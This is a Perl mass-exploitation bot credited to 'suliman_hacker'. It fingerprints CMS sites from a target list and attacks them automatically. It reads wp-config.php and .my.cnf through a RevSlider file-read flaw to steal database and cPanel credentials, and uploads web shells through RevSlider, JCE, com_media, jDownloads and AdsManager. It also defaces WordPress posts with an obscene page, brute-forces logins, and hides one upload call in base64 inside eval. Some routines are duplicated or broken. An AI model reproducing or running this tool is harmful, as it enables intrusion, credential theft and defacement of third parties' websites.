#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use Win32::Console::ANSI;
system("Title suliman_hacker Bot");
system("mode con LINES=40 COLS=80");
$logo =" \n
             |@|@|@|@|         |@|@|@|@| 1-Drupal Add Admin
             |@|@|@|@|   _____ |@|@|@|@| 2- Magento Add Admin
             |@|@|@|@| /\_T_T_/\ |@|@|@|@| 3-Opencart Brute Force
             |@|@|@|@||/\ T T /\||@|@|@|@| 4-Joomla .... 9 Exploits
              ~/T~~T~||~\/~T~\/~||~T~~T\~   5-Wordpress  4 Exploits
               \|__|_| \(-(O)-)/ |_|__|/
              _| _|    \\8_8//    |_ |_
            |(@)]   /~~[_____]~~\   [(@)|
              ~    (  |       |  )    ~
                  [~` ]       [ '~]
                  |~~|         |~~|
                  |  |         |  |
                 _<\/>_        _<\/>_
                /_====_\      /_====_\

   
";
 print color('bold yellow');

print $logo;
    print color('reset');

$mrspy ="
                 ___  ____     _              _____
                 |  \/  (_)   | |            /  ___|
                 | .  . |_ ___| |_ ___ _ __  \ `--. _ __  _   _
                 | |\/| | / __| __/ _ \ '__|  `--. \ '_ \| | | |
                 | |  | | \__ \ ||  __/ |    /\__/ / |_) | |_| |
                 \_|  |_/_|___/\__\___|_|    \____/| .__/ \__, |
                                                  | |     __/ |
                                                  |_|    |___/
                                        Bot suliman_hacker
";
    print color('bold red');

print $mrspy;
    print color('reset');

    print color('bold white');
    print color('reset');
print color("bold Green"), "Coded By suliman_hacker\n";
print color 'reset';
print color("bold yellow"),"Contact me facebook.com/007mrspy \n";
print color 'reset';
print color("bold white"),"Magic Tool  \n";
print color 'reset';


print "List : \n";
$list=<STDIN>;
##############################################
#      Big Thank's To Gassrini               #
#                                            #
##############################################
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
efrez();
}
system("PAUSE");

sub efrez($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);

my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print color('bold white');
    print "[WORDPRESS] $site \n";
    print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
	    close(save);
    revshell();
    gravity();
    upindex();
    wpinjetc();
	getconfig();

}

elsif($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
    print color('bold dark');
    print "[JOOMLA] $site \n";
    print color('reset');
open(save, '>>sites/joomla.txt');
    print save "$site\n";
    close(save);
    comjce();
    comediashell();
    comediaindex();
    comjdowloads();
    comblog();
comfabr();
indecomfabr();
mods();

    open(save, '>>tools/jce.txt');
    print save "$site\n";
    comjceshell();
    open (FILE, '>tools/jce.txt') or die "Cannot open file 'jce.txt'\n";    
    # write to file    
    print FILE "";
close (FILE);
    close(save);

    }
elsif($spyxy =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print color('bold yellow');
    print "[DRUPAL] $site \n";
    print color('reset');
open(save, '>>sites/DRUPAL.txt');
    print save "$site\n";
    close(save);
     Drupal();

    }elsif($spyxy =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
    print color('bold bleu');
    print "[Prestashop] $site \n";
    print color('reset');
open(save, '>>sites/Prestashop.txt');
    print save "$site\n";
    close(save);
    presta();
    }
    elsif($spyxy =~/\/Magento\/|\/js\/mage|\/skin\/frontend/) {
    print color('bold dark');
    print "[Magento] $site \n";
    print color('reset');   
open(save, '>>sites/Magento.txt');
    print save "$site\n";
	        open(save, '>>tools/mag.txt');
    print save "$site\n";
	magento();
        open (FILE, '>tools/mag.txt') or die "Cannot open file 'mag.txt'\n";    
    print FILE "";
close (FILE);
    close(save);
    }elsif($spyxy =~/\/opencart\/|\/view\/javascript|\/view\/javascript/) {

    }elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
        system("color 7");
    print \"[VBULLETiN] $site \n";
open(save, '>>sites/vbulletin.txt');
    print save "$site\n";
    close(save);
    }
    else{
    print color('bold red');
print "\n[UNKNOWN] $site\n";
    print color('reset');    
}
}
######################
######################
######################
###### Drupal ########
######################
######################
######################
sub Drupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
    print color('bold yellow');
print"Trying Drupal Password Change ...   ";
    print color('reset');

$drupalink = "http://localhost/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
$admin ="admin";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
    print color('bold green');
print " Success ... :D\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>BotV2/brute.txt');
    print save "[Drupal] $site | username : admin | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');
    }
}else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');


        }

}


######################
######################
######################
###### Jce Img #######
######################
######################
######################




  sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print "Trying JCE Image Upload ...   ";
if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["tools/spy.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "JCE Failed .... :(   \n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/spy.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>BotV2/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
	print "Success Upload Image  \n$site/spy.gif\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');

}
    }

######################
######################
######################
###### Media #######
######################
######################
######################
sub comediashell($site){
print"Trying Com Media Upload Shell3z ...";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
$shlez = "upmedia.php";
$shlz="$site/images/upmedia.php";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    print save "[Media] $site\n";
    close(save);
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/suliman_hacker/) {
    print "success \n [SHELL LINK] =>  $shlz\n ";
                open (TEXT, '>>BotV2/Shell3z.txt');
                print TEXT "\n[ COM MEDIA SHELL] =>$shlz \n";
                close (TEXT);

        }
        }  else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');
        }}
sub comediaindex(){
print"Trying Com Media Upload Index ...";
$filemedia = "tools/spy.txt";
$indexmedia="$site/images/spy.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 $check = $ua->get($indexmedia);
if($check->content =~/Hacked/ ) {
 print " Success Defaced \n ";

        print "[INDEX LINK] =>  $indexmedia \n";
        open (TEXT, '>>BotV2/index.txt');
        print TEXT "[ COM MEDIA Index] => $indexmedia \n";
        close (TEXT);


        $def="$shlz";
    zoneh();
        }
    } else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');
        }
}

######################
######################
######################
##### Jdownload ######
######################
######################
######################

    sub comjdowloads($site){
print"Trying comjdowloads Upload Shell3z ...   ";
$file="tools/spy.rar";
$filez="tools/spy.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/spy.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"suliman_hacker", mail=>"moetazbusiness@gmail.com", filetitle =>"suliman_hacker Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/suliman_hacker/) {
    print "success \n [SHELL LINK] =>  $shellpath\n ";
print "[SHELL LINK] => $shellpath \n";
        open (TEXT, '>>BotV2/Shell3z.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');
}


print"Trying comjdowloads Upload Index Or Gif ...   ";

$def = $site . '/images/jdownloads/screenshots/spy.html.j';
$filee="tools/spy.rar";
$filezz="tools/spy.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"suliman_hacker", mail=>"moetazbusiness@gmail.com", filetitle =>"suliman_hacker Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print "Success Defaced :D \n $def \n";
        open (TEXT, '>>BotV2/index.txt');
        print TEXT "[ JDWN Index] => $def\n";
        close (TEXT);

zoneh();
}else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');
        }
}
else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');

}

    }

######################
######################
######################
##### JcE sHell ######
######################
######################
######################
sub comjceshell(){
system("jce.bat");
}
####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
        print "Trying Com Ads Manger Upload  ... ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], name => "def.html"]);
if ($exploit->decoded_content =~ /def.html/) {
        open(save, '>>BotV2/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/def.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/suliman_hacker/) {
    print "Defaced ... :D \n ";

print "[INDEX LINK] => $def\n";
    zoneh();
        adshell();
    }
}else{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');

;
}
}




sub adshell(){

        print "Trying Ads Manger Upload Shell ... ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
my $exploitxx = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["adshell.jpg"], name => "cloud.php"]);
if ($exploitxx->decoded_content =~ /cloud.php/) {


my $check = $ua->get("$site/tmp/plupload/cloud.php")->content;
my $checkk = $ua->get("$site/cloud.php")->content;
if($checkk =~/suliman_hacker/) {
print "success :D\n";

print "[SHELL LINK] => $site/cloud.php\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[ADS] $site/cloud.php\n";
    close(save);
    my $checkjo = $ua->get("$site/cloud.php")->content;
}
}

}
####################
#mode exploit ######
####################
   sub mods($site){
        print "Trying mod_simplefileupload Shell Upload  ... ";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="spy.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/spy.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/suliman_hacker/) {
    print color('bold green');
print " Success ... :D\n";
    print color('reset');
        open (TEXT, '>>BotV2/Shell3z.txt');
        print TEXT "[ Shell LINK ] => $site/cloud.php\n";
        close (TEXT);
		        open (TEXT, '>>BotV2/index.txt');
		        print TEXT "[ Deface Link LINK ] => $site/readme.html\n";
        close (TEXT);

		$def =$site .'/readme.html';
zoneh();

}
else
{
    print color('bold red');
print " Failed ... :(\n";
    print color('reset');
}


}

######################
######################
######################
##### Magnti ######
######################
######################
######################
sub magento(){
system("magento.bat");
}
######################
######################
######################
##### Com Blog  ######
######################
######################
######################
sub comblog(){
print"Trying Com Blog Vul ...   ";


$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);

my $exploitblog = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/has been uploaded/) {
    print color('bold green');
print " Success ... :D\n";
    print color('reset');

    open(save, '>>BotV2/cmblog.txt');   
    print save "[blog] $site Try Manulle\n";   
    close(save);

    }
    else {    print color('bold red');
print "Failed .... :(\n";
    print color('reset');

}
}

######################
######################
######################
###### Revslider ######
######################
######################
######################
sub getconfig{
print"Trying Revslider Vul ...   ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "Sucess .... :(\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>BotV2/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>BotV2/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>BotV2/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>BotV2/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
    print color('bold red');
   print "Failed To Get Config  ......:(\n";
    print color('reset');

getcpconfig();

}

}
####################################################################################################
####################################################################################################

sub getcpconfig{
print colored ("[REVSLIDER GET CPANEL]",'white on_red');
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print " ...... ";
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
    open(save, '>>Result/vulntargets.txt');   
    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print color("red"),"\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print color("white"),"\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/cpanels.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{print " .. ";
print color('bold white');
print "[";
print color('reset');
print color('bold red');
print "NOT FOUNDED";
print color('reset');
print color('bold white');
print "] \n";
print color('reset');
}


}



sub getcpconfig{
print"Trying Get Cpanel Vul ...   ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print " Success ... :D\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>BotV2/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>BotV2/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');

}


}
#######################
# cpanel checker
#!/usr/bin/perl
# Cpanel Password Brute Forcer
# ----------------------------
#    re(c)oded By JOK3D
# Perl Version ( low speed ) wordlist http://www.mediafire.com/download/glyzo6ubjgo0n7k/14+million+pass.rar
# Original Advisory : Ycfd Association
# https://roryprayana.org
sub cpanelchec(){
use IO::Socket;
use LWP::Simple;
use MIME::Base64;
 
$host     = $url;
$user     = $user;
$port     = "2082";
$list     = "cpcheck.txt";
$file     = "cp.txt";
$url = $host.":".$port;

 
 
$numstart  = "-1";
 

open (PASSFILE, "<$list") || die "[-] Can't open the List of password file !";
@PASSWORDS = <PASSFILE>;
close PASSFILE;
foreach my $P (@PASSWORDS) {
chomp $P;
$passwd = $P;
print "Let Me Make Sur About T  : $passwd \n";
&brut;
};
sub brut() {
$authx = encode_base64($user.":".$passwd);
print $authx;
my $sock = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";
print $sock "GET / HTTP/1.1\n";
print $sock "Authorization: Basic $authx\n";
print $sock "Connection: Close\n\n";
read  $sock, $answer, 128;
close($sock);
 
if ($answer =~ /Moved/) {
print "\n [~] PASSWORD FOUND : $passwd \n";
exit();
}
}
}




######################
######################
######################
###### PMA SCAN ######
######################
######################
######################
sub pmaa{
print"Trying PHP MY ADMIN SCANNER ...   ";
use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
    print color('bold green');
print " Success ... :D\n";
    print color('reset');
open (TEXT, '>>BotV2/config.txt');
print TEXT "\n[PhpMyAdmin] $url \n\n";
close (TEXT);

}else{

    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');

}}

}
######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub wpinjetc(){
print"Trying Wordpress Inject ...   ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$def="														<h2><center>Hacked By suliman_hacker<center></h2>
						</div>
						<div class=\"post_content\">
							<p><title>Hacked By suliman_hacker
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By suliman_hacker</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>Fuck</font> suliman_hacker <font color=red>Fuck</font> suliman_hacker <font color=red>Hacked</font> Sniper-Jo <font color=red>Fuck</font> Sniper-Jo <font color=red>Fuck</font> Sniper-Jo <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><img src=\"http://store6.up-00.com/2017-05/149535847395381.gif\" width=\"15%\" /></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>THIS IS MY DICK FOR UR MUM AND UR SISTER SUCK IT MADAKER<br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" color=orange face=\"comic sans ms\"><b> <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
<p>  <br /> Done &copy 2017</p>
						</div>";
$file="spy.html";
$link=  $site . 'spy.html';
$sirina=$id . 'justracccwdata';
#print "[Def] $link\n";
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'Hacked By suliman_hacker', 'slug'=> $file,'content' => $def ];
$response = $ua->request($gassface);
$stat = $response->content;
#print $stat;
	if ($stat =~ /suliman_hacker/){
    print color('bold red');
print  "Success .... :(  \n";
    print color('reset');
$link=  $site . 'spy.html';
				    open(save, '>>BotV2/index.txt');  
    print save "$link\n";  
    close(save);
$def =$link ;
zoneh();
}
}else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');
}
}

######################
######################
######################
## Wordpress Brute ###
######################
######################
######################
sub wpbrute{
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";
print"Trying To Brute Force Wordpress ...   ";


print "\n USER : $admin\nPASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
    print color('bold green');
print " Success ... Brute Force Wordpress :D\n";
    print color('reset');
        open (TEXT, '>>BotV2/brute.txt');
        print TEXT "\n$site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
    print color('bold red');
print  "Brute Force Wordpress Failed .... :(  \n";
    print color('reset');

}
pmaa();
}
######################
######################
######################
## Revslider Shell ###
######################
######################
######################
sub revshell(){
print"Trying REVSLIDER SHELL ...   ";
my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["taz.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
print "[+] Payload successfully executed\n";
print "[*] Checking Shell Path\n";
my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($check =~/suliman_hacker/) {

    print "[+] Shell successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    } else { print "[-] Failed Shell\n"; }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($avada =~/suliman_hacker/) {

    print "[+] Avada successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    
}
else { print "[-] Failed Avada\n"; }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($striking_r =~/suliman_hacker/) {

    print "[+] striking_r successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed striking_r\n"; }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($IncredibleWP =~/suliman_hacker/) {

    print "[+] IncredibleWP successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed IncredibleWP\n"; }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($ultimatum =~/suliman_hacker/) {

    print "[+] ultimatum successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed ultimatum\n"; }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php")->content;
if($medicate =~/suliman_hacker/) {

    print "[+] medicate successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed medicate\n"; }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php")->content;
if($centum =~/suliman_hacker/) {

    print "[+] centum successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed centum\n"; }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($beach_apollo =~/suliman_hacker/) {

    print "[+] beach_apollo successfully uploaded\n";
